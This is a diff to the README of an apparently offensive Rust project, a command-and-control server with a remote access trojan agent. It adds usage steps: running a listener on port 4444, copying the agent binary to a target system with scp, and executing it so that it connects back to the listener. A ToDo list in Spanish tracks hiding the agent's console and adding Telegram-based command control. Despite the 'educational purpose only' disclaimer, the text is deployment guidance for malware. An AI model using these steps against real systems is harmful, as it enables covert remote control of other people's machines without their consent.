@@ -3,6 +3,42 @@ C2 and Rat written in Rust
 
 ## Educational purpose only, do not use it for illegal activities.
 
+## How to Use (Linux)
+
+### Prerequisites
+- Rust toolchain installed (`curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh`)
+- Git installed
+
+### Building the Project
+```bash
+# Clone the repository
+git clone <repository-url>
+cd C2R2
+
+# Build in release mode
+cargo build --release
+
+# The binaries will be located in target/release/
+```
+
+### Running the Listener
+```bash
+# Run the C2 listener
+./target/release/listener
+
+# Or with custom port
+./target/release/listener --port 4444
+```
+
+### Deploying the Agent
+```bash
+# Transfer the agent binary to target system
+scp target/release/agent user@target:/tmp/
+
+# Execute on target (example)
+./agent --server <listener-ip>:4444
+```
+
 ## ToDo
 
 - [x] Que no aparezca la consola del agente
@@ -21,3 +57,4 @@ C2 and Rat written in Rust
 
 ### Interfaz C2
 - [ ] Crear una interfaz mediante Telegram bot que permita enviar comandos y recibir respuestas de los agentes
+
